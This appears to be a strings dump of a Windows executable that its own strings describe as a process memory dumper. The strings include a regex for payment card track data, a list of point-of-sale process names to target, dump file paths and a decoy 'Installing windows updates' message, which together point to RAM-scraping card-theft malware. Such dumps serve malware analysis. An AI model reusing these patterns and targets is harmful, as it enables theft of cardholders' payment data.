[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x00000050 0x00000050 40  41           ascii   This program must be run under Win32\r\n$7
1    0x000002f8 0x000002f8 5   6            ascii   .text
2    0x0000031f 0x0000031f 6   7            ascii   `.data
3    0x00000348 0x00000348 4   5            ascii   .tls
4    0x00000370 0x00000370 6   7            ascii   .rdata
5    0x00000397 0x00000397 7   8            ascii   P.idata
6    0x000003bf 0x000003bf 7   8            ascii   @.edata
7    0x000003e7 0x000003e7 6   7            ascii   @.rsrc
8    0x0000040f 0x0000040f 7   8            ascii   @.reloc
626  0x0000e845 0x0040f245 4   5    .text   ascii   K,I;
627  0x0000e84d 0x0040f24d 5   6    .text   ascii   >\nt\a3
628  0x0000e85e 0x0040f25e 4   5    .text   ascii   ;s(t
629  0x0000e87d 0x0040f27d 7   9    .text   utf8    ;s,s\r3Ҋ blocks=Basic Latin,Cyrillic
630  0x0000e8d7 0x0040f2d7 5   6    .text   ascii   ;s,s\f
631  0x0000e8dd 0x0040f2dd 5   6    .text   ascii   >\nu\a3
632  0x0000e8ea 0x0040f2ea 7   8    .text   ascii   F;S,r\a3
633  0x0000e8fd 0x0040f2fd 4   5    .text   ascii   ;s,s
634  0x0000e904 0x0040f304 4   7    .text   utf8    3ɊʋC blocks=Basic Latin,Latin Extended-B,IPA Extensions
635  0x0000e91f 0x0040f31f 4   5    .text   ascii   ;s,s
636  0x0000e926 0x0040f326 4   7    .text   utf8    3ɊʋC blocks=Basic Latin,Latin Extended-B,IPA Extensions
637  0x0000e941 0x0040f341 4   5    .text   ascii   ;s,s
638  0x0000e948 0x0040f348 4   7    .text   utf8    3ɊʋC blocks=Basic Latin,Latin Extended-B,IPA Extensions
639  0x0000e963 0x0040f363 4   5    .text   ascii   ;s,s
640  0x0000e96a 0x0040f36a 4   7    .text   utf8    3ɊʋC blocks=Basic Latin,Latin Extended-B,IPA Extensions
641  0x0000e985 0x0040f385 4   5    .text   ascii   ;s,s
642  0x0000e98c 0x0040f38c 4   7    .text   utf8    3ɊʋC blocks=Basic Latin,Latin Extended-B,IPA Extensions
643  0x0000e9a7 0x0040f3a7 4   5    .text   ascii   ;s,s
644  0x0000e9ae 0x0040f3ae 4   7    .text   utf8    3ɊʋC blocks=Basic Latin,Latin Extended-B,IPA Extensions
645  0x0000eb29 0x0040f529 4   5    .text   ascii   U Rj
646  0x0000ebbf 0x0040f5bf 4   5    .text   ascii   U Rj
647  0x0000ecad 0x0040f6ad 7   8    .text   ascii   K;s,r\a3
648  0x0000ed12 0x0040f712 4   5    .text   ascii   M Qj
649  0x0000ed40 0x0040f740 6   7    .text   ascii   ;s,r\a3
650  0x0000ed94 0x0040f794 9   11   .text   utf8    }=;s,s83Ҹ blocks=Basic Latin,Cyrillic
651  0x0000edd9 0x0040f7d9 4   5    .text   ascii   M Qj
652  0x0000ee36 0x0040f836 5   8    .text   utf8    G3ɊʋC blocks=Basic Latin,Latin Extended-B,IPA Extensions
653  0x0000ee43 0x0040f843 5   8    .text   utf8    F3\nKK
654  0x0000eec9 0x0040f8c9 4   6    .text   utf8    ?3\n\a
655  0x0000ef4b 0x0040f94b 4   7    .text   utf8    3ҊЋK blocks=Basic Latin,Cyrillic
656  0x0000ef88 0x0040f988 4   5    .text   ascii   U Rj
657  0x0000efb6 0x0040f9b6 4   5    .text   ascii   ;s,s
658  0x0000efbd 0x0040f9bd 4   7    .text   utf8    3\nKS
659  0x0000efea 0x0040f9ea 6   7    .text   ascii   }";s,s
660  0x0000f014 0x0040fa14 4   5    .text   ascii   U Rj
661  0x0000f096 0x0040fa96 4   5    .text   ascii   U Rj
662  0x0000f0c4 0x0040fac4 5   6    .text   ascii   ;s,s\f
663  0x0000f0f2 0x0040faf2 4   5    .text   ascii   ;s,s
664  0x0000f112 0x0040fb12 4   5    .text   ascii   M Qj
665  0x0000f149 0x0040fb49 6   7    .text   ascii   ;s,r\a3
666  0x0000f15e 0x0040fb5e 5   8    .text   utf8    G3ɊʋC blocks=Basic Latin,Latin Extended-B,IPA Extensions
667  0x0000f16b 0x0040fb6b 5   8    .text   utf8    F3\nKK
668  0x0000f25b 0x0040fc5b 4   7    .text   utf8    3ҊЋK blocks=Basic Latin,Cyrillic
669  0x0000f298 0x0040fc98 4   5    .text   ascii   U Rj
670  0x0000f2c6 0x0040fcc6 4   5    .text   ascii   ;s,s
671  0x0000f2cd 0x0040fccd 4   7    .text   utf8    3\nKS
672  0x0000f2fa 0x0040fcfa 6   7    .text   ascii   }";s,s
673  0x0000f324 0x0040fd24 4   5    .text   ascii   U Rj
674  0x0000f3a6 0x0040fda6 4   5    .text   ascii   U Rj
675  0x0000f3d4 0x0040fdd4 5   6    .text   ascii   ;s,s\f
676  0x0000f402 0x0040fe02 4   5    .text   ascii   ;s,s
677  0x0000f422 0x0040fe22 4   5    .text   ascii   M Qj
678  0x0000f524 0x0040ff24 5   11   .text   utf16le @7AnA
679  0x0000f565 0x0040ff65 6   7    .text   ascii   F<\nu\a3
680  0x0000f59e 0x0040ff9e 4   7    .text   utf8    3ҊЋK blocks=Basic Latin,Cyrillic
681  0x0000f5d8 0x0040ffd8 4   7    .text   utf8    3ҊЋK blocks=Basic Latin,Cyrillic
682  0x0000f612 0x00410012 4   7    .text   utf8    3ҊЋK blocks=Basic Latin,Cyrillic
683  0x0000f64c 0x0041004c 4   7    .text   utf8    3ҊЋK blocks=Basic Latin,Cyrillic
684  0x0000f67f 0x0041007f 4   7    .text   utf8    3ҊЋK blocks=Basic Latin,Cyrillic
685  0x0000f6b2 0x004100b2 4   7    .text   utf8    3ҊЋK blocks=Basic Latin,Cyrillic
686  0x0000f6ef 0x004100ef 4   5    .text   ascii   U Rj
687  0x0000f71d 0x0041011d 6   7    .text   ascii   ;s,r\a3
688  0x0000f780 0x00410180 4   5    .text   ascii   \nuy3
689  0x0000f89c 0x0041029c 5   7    .text   utf8    S,+։U blocks=Basic Latin,Armenian
690  0x0000f96e 0x0041036e 9   11   .text   utf8    }z;s,su3Ҋ blocks=Basic Latin,Cyrillic
691  0x0000f99c 0x0041039c 9   11   .text   utf8    }L;s,sG3\n
692  0x0000f9cc 0x004103cc 4   5    .text   ascii   ;s,s
693  0x0000f9f0 0x004103f0 4   5    .text   ascii   M Qj
694  0x0000fab9 0x004104b9 7   8    .text   ascii   >ERCPt\n
695  0x0000fb49 0x00410549 6   9    .text   utf8    33\nM<@
696  0x0000fb9a 0x0041059a 4   6    .text   utf8    3ҊV\n blocks=Basic Latin,Cyrillic
697  0x0000fbaa 0x004105aa 4   5    .text   ascii   ;M ~
698  0x0000fbbe 0x004105be 4   6    .text   utf8    3\nF\f
699  0x0000fc25 0x00410625 5   7    .text   utf8    su3Ɋ\v blocks=Basic Latin,Latin Extended-B
700  0x0000fc39 0x00410639 4   5    .text   ascii   bC;]
701  0x0000fc3e 0x0041063e 7   9    .text   utf8    s\3Ɋ\v;M blocks=Basic Latin,Latin Extended-B
702  0x0000fc6a 0x0041066a 4   5    .text   ascii   t0;]
703  0x0000fc6f 0x0041066f 4   6    .text   utf8    s+3\n
704  0x0000fce9 0x004106e9 5   6    .text   ascii   ;M ~\a
705  0x0000fd2c 0x0041072c 4   6    .text   utf8    +M̉J blocks=Basic Latin,Combining Diacritical Marks
706  0x0000fd6b 0x0041076b 4   5    .text   ascii   SVW3
707  0x0000fd80 0x00410780 4   5    .text   ascii   \b:\nu
708  0x0000fdb2 0x004107b2 6   8    .text   utf8    _^[]ÐU blocks=Basic Latin,Latin-1 Supplement
709  0x0000fe5c 0x0041085c 8   10   .text   utf8    _^[YY]ÐU blocks=Basic Latin,Latin-1 Supplement
710  0x0000feda 0x004108da 5   6    .text   ascii   ^[YY]
711  0x0000ff22 0x00410922 4   5    .text   ascii   E\fPj
712  0x0000ffb7 0x004109b7 4   5    .text   ascii   _^[]
713  0x00010080 0x00410a80 4   5    .text   ascii   QSVW
714  0x0001013d 0x00410b3d 5   6    .text   ascii   _^[Y]
715  0x00010196 0x00410b96 6   7    .text   ascii   \aKt\rKt
716  0x000101dd 0x00410bdd 4   5    .text   ascii   tmh2
717  0x000101fa 0x00410bfa 6   7    .text   ascii   \aKt\rKt
718  0x0001024b 0x00410c4b 5   6    .text   ascii   \f_^[]
719  0x00010272 0x00410c72 6   7    .text   ascii   E\f@@Pj
720  0x000102f8 0x00410cf8 6   7    .text   ascii   \aNt\rNt
721  0x00010350 0x00410d50 5   6    .text   ascii   \f_^[]
722  0x0001037b 0x00410d7b 6   7    .text   ascii   \aKt\rKt
723  0x00010390 0x00410d90 5   6    .text   ascii   U\fY[]
724  0x0001039a 0x00410d9a 7   9    .text   utf8    U\f[]ËE\b blocks=Basic Latin,Latin-1 Supplement
725  0x000103a3 0x00410da3 4   5    .text   ascii   U\f[]
726  0x000103ac 0x00410dac 5   7    .text   utf8    U\f[]ú blocks=Basic Latin,Latin-1 Supplement
727  0x0001044f 0x00410e4f 4   6    .text   utf8    U؋J\b blocks=Basic Latin,Arabic
728  0x00010455 0x00410e55 5   7    .text   utf8    M؍FRP blocks=Basic Latin,Arabic
729  0x00010493 0x00410e93 5   8    .text   utf8    UЋM؉J blocks=Basic Latin,Cyrillic,Arabic
730  0x000104a7 0x00410ea7 4   6    .text   utf8    3\tA(
731  0x000104af 0x00410eaf 4   6    .text   utf8    3ɉJ, blocks=Basic Latin,Latin Extended-B
732  0x000104bf 0x00410ebf 4   6    .text   utf8    UЋM  blocks=Basic Latin,Cyrillic
733  0x000104c8 0x00410ec8 4   6    .text   utf8    EЋU$ blocks=Basic Latin,Cyrillic
734  0x0001054b 0x00410f4b 4   6    .text   utf8    EЀxD blocks=Basic Latin,Cyrillic
735  0x0001055c 0x00410f5c 6   8    .text   utf8    MЋQ@RS blocks=Basic Latin,Cyrillic
736  0x00010571 0x00410f71 4   5    .text   ascii   Pj\vj
737  0x000105f5 0x00410ff5 6   9    .text   utf8    M\rM\vE(
738  0x000105fe 0x00410ffe 5   8    .text   utf8    EċUЉU blocks=Basic Latin,Latin Extended-A,Cyrillic
739  0x00010629 0x00411029 8   9    .text   ascii   QUVWRSPT
740  0x0001065c 0x0041105c 4   5    .text   ascii   QSVW
741  0x00010669 0x00411069 5   6    .text   ascii   VWRSP
742  0x000106bd 0x004110bd 6   7    .text   ascii   0_^[Y]
743  0x0001079e 0x0041119e 4   5    .text   ascii   p(PR
744  0x00010875 0x00411275 5   6    .text   ascii   \f;s(t
745  0x000108fe 0x004112fe 6   7    .text   ascii   C(;E\ft
746  0x0001091d 0x0041131d 6   7    .text   ascii   S,;U\bt
747  0x00010be0 0x004115e0 4   5    .text   ascii   U\b+P
748  0x00010c47 0x00411647 4   5    .text   ascii   SUVW
749  0x00010c62 0x00411662 4   5    .text   ascii   _^][
750  0x00010c84 0x00411684 6   7    .text   ascii   V(;U\bu
751  0x00010c8b 0x0041168b 5   6    .text   ascii   ;^0t\f
752  0x00010d1e 0x0041171e 5   6    .text   ascii   t\t;]\f
753  0x00010dbd 0x004117bd 4   5    .text   ascii   E\f+G
754  0x00010fe4 0x004119e4 4   5    .text   ascii   Q@RS
755  0x00010fed 0x004119ed 5   6    .text   ascii   YPSVj
756  0x00011037 0x00411a37 4   6    .text   utf8    E܋U\b blocks=Basic Latin,Syriac
757  0x00011055 0x00411a55 4   5    .text   ascii   SUVW
758  0x00011070 0x00411a70 4   5    .text   ascii   _^][
759  0x000110b0 0x00411ab0 5   7    .text   utf8    U\f3ɉJ blocks=Basic Latin,Latin Extended-B
760  0x00011169 0x00411b69 5   6    .text   ascii   ;K s\e
761  0x000111aa 0x00411baa 4   5    .text   ascii   s(VS
762  0x00011228 0x00411c28 4   5    .text   ascii   u\fRP
763  0x0001123e 0x00411c3e 4   5    .text   ascii   _^[]
764  0x00011338 0x00411d38 4   7    .text   utf8    \f럋M\f blocks=Basic Latin,Hangul Syllables
765  0x00011610 0x00412010 6   7    .text   ascii   _^[YY]
766  0x00011699 0x00412099 4   5    .text   ascii   _^[]
767  0x000116c3 0x004120c3 4   5    .text   ascii   U\f)U
768  0x00011824 0x00412224 5   6    .text   ascii   @\f tp
769  0x0001182c 0x0041222c 4   5    .text   ascii   \btj3
770  0x000118c7 0x004122c7 4   5    .text   ascii   ~ ;}
771  0x000118cc 0x004122cc 4   5    .text   ascii   s\v)}
772  0x00011996 0x00412396 5   6    .text   ascii   @\f t!
773  0x00011b05 0x00412505 4   6    .text   utf8    Y3҉U blocks=Basic Latin,Cyrillic
774  0x00011b31 0x00412531 4   6    .text   utf8    []ËS blocks=Basic Latin,Latin-1 Supplement
775  0x00011b79 0x00412579 4   5    .text   ascii   %`1C
776  0x00011b7f 0x0041257f 4   5    .text   ascii   %d1C
777  0x00011b85 0x00412585 4   5    .text   ascii   %h1C
778  0x00011b8b 0x0041258b 4   5    .text   ascii   %l1C
779  0x00011b91 0x00412591 4   5    .text   ascii   %p1C
780  0x00011b97 0x00412597 4   5    .text   ascii   %t1C
781  0x00011b9d 0x0041259d 4   5    .text   ascii   %x1C
782  0x00011ba3 0x004125a3 4   5    .text   ascii   %|1C
783  0x00011c75 0x00412675 4   5    .text   ascii   %\b2C
784  0x00011c7b 0x0041267b 4   5    .text   ascii   %\f2C
785  0x00011c99 0x00412699 4   5    .text   ascii   % 2C
786  0x00011c9f 0x0041269f 4   5    .text   ascii   %$2C
787  0x00011ca5 0x004126a5 4   5    .text   ascii   %(2C
788  0x00011cab 0x004126ab 4   5    .text   ascii   %,2C
789  0x00011cb1 0x004126b1 4   5    .text   ascii   %02C
790  0x00011cb7 0x004126b7 4   5    .text   ascii   %42C
791  0x00011cbd 0x004126bd 4   5    .text   ascii   %82C
792  0x00011cc3 0x004126c3 4   5    .text   ascii   %<2C
793  0x00011cc9 0x004126c9 4   5    .text   ascii   %@2C
794  0x00011ccf 0x004126cf 4   5    .text   ascii   %D2C
795  0x00011cd5 0x004126d5 4   5    .text   ascii   %H2C
796  0x00011cdb 0x004126db 4   5    .text   ascii   %L2C
797  0x00011ce1 0x004126e1 4   5    .text   ascii   %P2C
798  0x00011ce7 0x004126e7 4   5    .text   ascii   %T2C
799  0x00011ced 0x004126ed 4   5    .text   ascii   %X2C
800  0x00011cf3 0x004126f3 4   5    .text   ascii   %\2C
801  0x00011cf9 0x004126f9 4   5    .text   ascii   %`2C
802  0x00011cff 0x004126ff 4   5    .text   ascii   %d2C
803  0x00011d05 0x00412705 4   5    .text   ascii   %h2C
804  0x00011e9b 0x0041309b 49  50   .data   ascii   PBorland C++ - Copyright 1999 Inprise Corporation
805  0x00011f40 0x00413140 9   10   .data   ascii   <unknown>
806  0x0002a6e5 0x0042b8e5 273 274  .data   ascii   ((B(([0-9]{13,16})|([0-9]|\s){13,25})\^[A-Z\s0-9]{0,30}\/[A-Z\s0-9]{0,30}\^(0[7-9]|1[0-9])((0[1-9])|(1[0-2]))([0-9]|\s){3,50})|([0-9]{15,16}([A-Z]|=)(0[7-9]|1[0-9])((0[1-9])|(1[0-2]))[0-9]{8,30})|(<Field name="CardNumber">[0-9]{15,19}</Field>)|(~CCM[0-9]{15,19}D[0-9]{4}~))
807  0x0002a7f7 0x0042b9f7 9   10   .data   ascii   <unknown>
808  0x0002a8fc 0x0042bafc 10  11   .data   ascii   pid-%s.dmp
809  0x0002a907 0x0042bb07 47  48   .data   ascii   Dumping private memory for pid %s to %s.dmp...\n
810  0x0002a937 0x0042bb37 6   7    .data   ascii   Done!\n
811  0x0002a93e 0x0042bb3e 6   7    .data   ascii   Done!\n
812  0x0002a945 0x0042bb45 30  31   .data   ascii   Installing windows updates...\n
813  0x0002a964 0x0042bb64 23  24   .data   ascii   \tProcess Memory Dumper\n
814  0x0002a97c 0x0042bb7c 48  49   .data   ascii   \tMade By: DiabloHorn (Proud Member of: KD-Team)\n
815  0x0002a9ad 0x0042bbad 39  40   .data   ascii   \t\tUse as: memdump.exe -<options> [PID]\n
816  0x0002a9d5 0x0042bbd5 11  12   .data   ascii   \t\tOptions:\n
817  0x0002a9e1 0x0042bbe1 23  24   .data   ascii   \t\t\t-? = Show this help\n
818  0x0002a9f9 0x0042bbf9 35  36   .data   ascii   \t\t\t-l = List all running processes\n
819  0x0002aa1d 0x0042bc1d 39  40   .data   ascii   \t\t\t-s = show info on Process like Path\n
820  0x0002aa45 0x0042bc45 43  44   .data   ascii   \t\t\t-f = Dump private process memory by PID\n
821  0x0002aa71 0x0042bc71 51  52   .data   ascii   \t\t\t-f = Full private dump of all running processes\n
822  0x0002aaa5 0x0042bca5 22  23   .data   ascii   %s\t(PID: %u)\tHex: %xh\n
823  0x0002aabc 0x0042bcbc 18  19   .data   ascii   Enter Process Id: 
824  0x0002aad2 0x0042bcd2 23  24   .data   ascii   Module Snapshot Failed\n
825  0x0002aaea 0x0042bcea 26  27   .data   ascii   Module Snapshot succeeded\n
826  0x0002ab05 0x0042bd05 36  37   .data   ascii   Gathering Module information failed\n
827  0x0002ab2a 0x0042bd2a 14  15   .data   ascii   Module ID: %u\n
828  0x0002ab39 0x0042bd39 23  24   .data   ascii   Global usage count: %u\n
829  0x0002ab51 0x0042bd51 23  24   .data   ascii   Module usage count: %u\n
830  0x0002ab69 0x0042bd69 20  21   .data   ascii   Base address: 0x%Xh\n
831  0x0002ab7e 0x0042bd7e 14  15   .data   ascii   Base size: %u\n
832  0x0002ab8d 0x0042bd8d 14  15   .data   ascii   Full path: %s\n
833  0x0002ab9c 0x0042bd9c 15  16   .data   ascii   Regex Error!!! 
834  0x0002abac 0x0042bdac 36  37   .data   ascii   Found track data at %s with PID %d!\n
835  0x0002abd1 0x0042bdd1 9   10   .data   ascii   <unknown>
836  0x0002abdb 0x0042bddb 22  23   .data   ascii   memdump\data-%s-%d.dmp
837  0x0002abf2 0x0042bdf2 28  29   .data   ascii   memdump\data-pid$only-%d.dmp
838  0x0002ac0f 0x0042be0f 36  37   .data   ascii   Found track data at %s with PID %d!\n
839  0x0002ac34 0x0042be34 4   5    .data   ascii   %.*s
840  0x0002ac39 0x0042be39 21  22   .data   ascii   data: %s length: %d!\n
841  0x0002ac4f 0x0042be4f 21  22   .data   ascii   data: %s length: %d!\n
842  0x0002ac65 0x0042be65 25  26   .data   ascii   Pid %d in not acessible!\n
843  0x0002ac7f 0x0042be7f 37  38   .data   ascii   Current address: %d Size: %d max: %d\n
844  0x0002aca5 0x0042bea5 24  25   .data   ascii   mkdir memdump >NUL 2>NUL
845  0x0002acbe 0x0042bebe 34  35   .data   ascii   if not exist memdump mkdir memdump
846  0x0002ace4 0x0042bee4 20  21   .data   ascii   pms_xmlinterface.exe
847  0x0002acf9 0x0042bef9 9   10   .data   ascii   sslgw.exe
848  0x0002ad03 0x0042bf03 9   10   .data   ascii   visad.exe
849  0x0002ad0d 0x0042bf0d 14  15   .data   ascii   mcc.client.exe
850  0x0002ad1c 0x0042bf1c 20  21   .data   ascii   adihttpserversvc.exe
851  0x0002ad31 0x0042bf31 17  18   .data   ascii   memdump\%s-%d.dmp
852  0x0002ad48 0x0042bf48 8   9    .data   ascii   borlndmm
853  0x0002ad51 0x0042bf51 47  48   .data   ascii   hrdir_b.c: LoadLibrary != mmdll borlndmm failed
854  0x0002ad81 0x0042bf81 8   9    .data   ascii   borlndmm
855  0x0002ad8a 0x0042bf8a 24  25   .data   ascii   @Borlndmm@SysGetMem$qqri
856  0x0002ada3 0x0042bfa3 26  27   .data   ascii   @Borlndmm@SysFreeMem$qqrpv
857  0x0002adbe 0x0042bfbe 30  31   .data   ascii   @Borlndmm@SysReallocMem$qqrpvi
858  0x0002ae4c 0x0042c04c 8   9    .data   ascii   <notype>
859  0x0002ae55 0x0042c055 10  11   .data   ascii   id->tpName
860  0x0002ae60 0x0042c060 10  11   .data   ascii   xxtype.cpp
861  0x0002ae6f 0x0042c06f 10  11   .data   ascii   xxtype.cpp
862  0x0002ae7e 0x0042c07e 10  11   .data   ascii   xxtype.cpp
863  0x0002ae89 0x0042c089 11  12   .data   ascii   tp1->tpName
864  0x0002ae95 0x0042c095 10  11   .data   ascii   xxtype.cpp
865  0x0002aea0 0x0042c0a0 11  12   .data   ascii   tp2->tpName
866  0x0002aeac 0x0042c0ac 10  11   .data   ascii   xxtype.cpp
867  0x0002aeb7 0x0042c0b7 22  23   .data   ascii   IS_STRUC(base->tpMask)
868  0x0002aece 0x0042c0ce 10  11   .data   ascii   xxtype.cpp
869  0x0002aed9 0x0042c0d9 22  23   .data   ascii   IS_STRUC(derv->tpMask)
870  0x0002aef0 0x0042c0f0 10  11   .data   ascii   xxtype.cpp
871  0x0002aefb 0x0042c0fb 37  38   .data   ascii   derv->tpClass.tpcFlags & CF_HAS_BASES
872  0x0002af21 0x0042c121 10  11   .data   ascii   xxtype.cpp
873  0x0002af2c 0x0042c12c 38  39   .data   ascii   ((unsigned __far *)vtablePtr)[-1] == 0
874  0x0002af53 0x0042c153 10  11   .data   ascii   xxtype.cpp
875  0x0002af5e 0x0042c15e 8   9    .data   ascii   <notype>
876  0x0002af67 0x0042c167 45  46   .data   ascii   topTypPtr != 0 && IS_STRUC(topTypPtr->tpMask)
877  0x0002af95 0x0042c195 10  11   .data   ascii   xxtype.cpp
878  0x0002afa0 0x0042c1a0 45  46   .data   ascii   tgtTypPtr != 0 && IS_STRUC(tgtTypPtr->tpMask)
879  0x0002afce 0x0042c1ce 10  11   .data   ascii   xxtype.cpp
880  0x0002afd9 0x0042c1d9 45  46   .data   ascii   srcTypPtr == 0 || IS_STRUC(srcTypPtr->tpMask)
881  0x0002b007 0x0042c207 10  11   .data   ascii   xxtype.cpp
882  0x0002b012 0x0042c212 41  42   .data   ascii   __isSameTypeID(srcTypPtr, tgtTypPtr) == 0
883  0x0002b03c 0x0042c23c 10  11   .data   ascii   xxtype.cpp
884  0x0002b047 0x0042c247 59  60   .data   ascii   tgtTypPtr != 0 && __isSameTypeID(topTypPtr, tgtTypPtr) == 0
885  0x0002b083 0x0042c283 10  11   .data   ascii   xxtype.cpp
886  0x0002b08e 0x0042c28e 9   10   .data   ascii   srcTypPtr
887  0x0002b098 0x0042c298 10  11   .data   ascii   xxtype.cpp
888  0x0002b0a3 0x0042c2a3 38  39   .data   ascii   ((unsigned __far *)vtablePtr)[-1] == 0
889  0x0002b0ca 0x0042c2ca 10  11   .data   ascii   xxtype.cpp
890  0x0002b0d5 0x0042c2d5 4   5    .data   ascii   addr
891  0x0002b0da 0x0042c2da 10  11   .data   ascii   xxtype.cpp
892  0x0002b0e5 0x0042c2e5 54  55   .data   ascii   Can't adjust class address (no base class entry found)
893  0x0002b11c 0x0042c31c 57  58   .data   ascii   !"Can't adjust class address (no base class entry found)"
894  0x0002b156 0x0042c356 10  11   .data   ascii   xxtype.cpp
895  0x0002b240 0x0042c440 15  16   .data   ascii   ___CPPdebugHook
896  0x0002b288 0x0042c488 15  16   .data   ascii   Stack Overflow!
897  0x0002b838 0x0042ca38 12  13   .data   ascii   ),(((((),(((
898  0x0002b85c 0x0042ca5c 4   5    .data   ascii   *(((
899  0x0002ba18 0x0042cc18 7   8    .data   ascii   Error 0
900  0x0002ba20 0x0042cc20 23  24   .data   ascii   Invalid function number
901  0x0002ba38 0x0042cc38 25  26   .data   ascii   No such file or directory
902  0x0002ba52 0x0042cc52 14  15   .data   ascii   Path not found
903  0x0002ba61 0x0042cc61 19  20   .data   ascii   Too many open files
904  0x0002ba75 0x0042cc75 17  18   .data   ascii   Permission denied
905  0x0002ba87 0x0042cc87 15  16   .data   ascii   Bad file number
906  0x0002ba97 0x0042cc97 20  21   .data   ascii   Memory arena trashed
907  0x0002baac 0x0042ccac 17  18   .data   ascii   Not enough memory
908  0x0002babe 0x0042ccbe 28  29   .data   ascii   Invalid memory block address
909  0x0002badb 0x0042ccdb 19  20   .data   ascii   Invalid environment
910  0x0002baef 0x0042ccef 14  15   .data   ascii   Invalid format
911  0x0002bafe 0x0042ccfe 19  20   .data   ascii   Invalid access code
912  0x0002bb12 0x0042cd12 12  13   .data   ascii   Invalid data
913  0x0002bb1f 0x0042cd1f 11  12   .data   ascii   Bad address
914  0x0002bb2b 0x0042cd2b 14  15   .data   ascii   No such device
915  0x0002bb3a 0x0042cd3a 37  38   .data   ascii   Attempted to remove current directory
916  0x0002bb60 0x0042cd60 15  16   .data   ascii   Not same device
917  0x0002bb70 0x0042cd70 13  14   .data   ascii   No more files
918  0x0002bb7e 0x0042cd7e 16  17   .data   ascii   Invalid argument
919  0x0002bb8f 0x0042cd8f 16  17   .data   ascii   Arg list too big
920  0x0002bba0 0x0042cda0 17  18   .data   ascii   Exec format error
921  0x0002bbb2 0x0042cdb2 17  18   .data   ascii   Cross-device link
922  0x0002bbc4 0x0042cdc4 19  20   .data   ascii   Too many open files
923  0x0002bbd8 0x0042cdd8 18  19   .data   ascii   No child processes
924  0x0002bbeb 0x0042cdeb 35  36   .data   ascii   Inappropriate I/O control operation
925  0x0002bc0f 0x0042ce0f 22  23   .data   ascii   Executable file in use
926  0x0002bc26 0x0042ce26 14  15   .data   ascii   File too large
927  0x0002bc35 0x0042ce35 23  24   .data   ascii   No space left on device
928  0x0002bc4d 0x0042ce4d 12  13   .data   ascii   Illegal seek
929  0x0002bc5a 0x0042ce5a 21  22   .data   ascii   Read-only file system
930  0x0002bc70 0x0042ce70 14  15   .data   ascii   Too many links
931  0x0002bc7f 0x0042ce7f 11  12   .data   ascii   Broken pipe
932  0x0002bc8b 0x0042ce8b 13  14   .data   ascii   Math argument
933  0x0002bc99 0x0042ce99 16  17   .data   ascii   Result too large
934  0x0002bcaa 0x0042ceaa 19  20   .data   ascii   File already exists
935  0x0002bcbe 0x0042cebe 17  18   .data   ascii   Possible deadlock
936  0x0002bcd0 0x0042ced0 23  24   .data   ascii   Operation not permitted
937  0x0002bce8 0x0042cee8 15  16   .data   ascii   No such process
938  0x0002bcf8 0x0042cef8 25  26   .data   ascii   Interrupted function call
939  0x0002bd12 0x0042cf12 18  19   .data   ascii   Input/output error
940  0x0002bd25 0x0042cf25 25  26   .data   ascii   No such device or address
941  0x0002bd3f 0x0042cf3f 32  33   .data   ascii   Resource temporarily unavailable
942  0x0002bd60 0x0042cf60 21  22   .data   ascii   Block device required
943  0x0002bd76 0x0042cf76 13  14   .data   ascii   Resource busy
944  0x0002bd84 0x0042cf84 15  16   .data   ascii   Not a directory
945  0x0002bd94 0x0042cf94 14  15   .data   ascii   Is a directory
946  0x0002bda4 0x0042cfa4 19  20   .data   ascii   Directory not empty
947  0x0002bdb8 0x0042cfb8 13  14   .data   ascii   Unknown error
948  0x0002be30 0x0042d030 6   7    .data   ascii   \b\v\v\v\r\n
949  0x0002be50 0x0042d050 6   7    .data   ascii   (null)
950  0x0002be58 0x0042d058 6   14   .data   utf16le (null)
951  0x0002beca 0x0042d0ca 33  68   .data   utf16le          (((((                  H
952  0x0002c10b 0x0042d30b 4   5    .data   ascii   %+0I
953  0x0002c113 0x0042d313 4   5    .data   ascii   %+0M
954  0x0002c11b 0x0042d31b 4   5    .data   ascii   %+0S
955  0x0002c123 0x0042d323 4   5    .data   ascii   %+0H
956  0x0002c131 0x0042d331 4   5    .data   ascii   %+0d
957  0x0002c13f 0x0042d33f 4   5    .data   ascii   %+0m
958  0x0002c14d 0x0042d34d 4   5    .data   ascii   %+0y
959  0x0002c15f 0x0042d35f 7   8    .data   ascii   \a\b\t\n\v\f\r
960  0x0002c178 0x0042d378 95  96   .data   ascii    !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
961  0x0002c25f 0x0042d45f 7   8    .data   ascii   \a\b\t\n\v\f\r
